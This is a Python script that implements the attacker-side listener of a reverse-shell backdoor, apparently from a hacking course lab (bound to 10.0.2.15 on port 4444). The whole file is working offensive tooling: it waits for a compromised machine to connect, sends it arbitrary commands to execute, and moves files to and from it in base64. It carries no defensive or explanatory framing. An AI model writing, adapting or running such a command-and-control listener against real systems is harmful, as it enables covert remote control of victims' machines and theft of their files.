#!/usr/bin/env python
import socket,json,base64
class Listener:
    def __init__(self,ip,port):
        listener = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
        listener.bind((ip,port))
        listener.listen(0)
        print("[+] Waiting for incoming connections")
        self.connection, address = listener.accept()
        print("[+] Got a connection from" + str(address))

    def reliable_send(self,data):
        json_data = json.dumps(data) # decode()
        self.connection.send(json_data.encode('utf-8'))

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024).decode()
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_remotely(self,command):
        self.reliable_send(command) # encode('utf-8')
        if command[0] == "exit":
            self.connection.close()
            exit()
        #self.connection.send(command.encode('utf-8'))
        #return self.connection.recv(1024)
        return self.reliable_receive()

    def write_file(self,path,content):
        with open(path,"wb") as file:
            file.write(base64.b64decode(content)) # encode('utf-8')
            return "[+] Download successful"

    def read_file(self,path):
        with open(path,'rb') as file:
            return base64.b64encode(file.read())

    def run(self):
        while True:
            command = input(">>")
            command = command.split(" ")
            try :
                if command[0] == "upload":
                    file_content = self.read_file(command[1])
                    command.append(file_content)

                result = self.execute_remotely(command)

                if command[0] == "download" and "[-] Error" not in result:
                    result = self.write_file(command[1],result)
            except Exception:
                result = "[-] Error has been raised during command execution."
            print(result)
myListener = Listener("10.0.2.15",4444)
myListener.run()
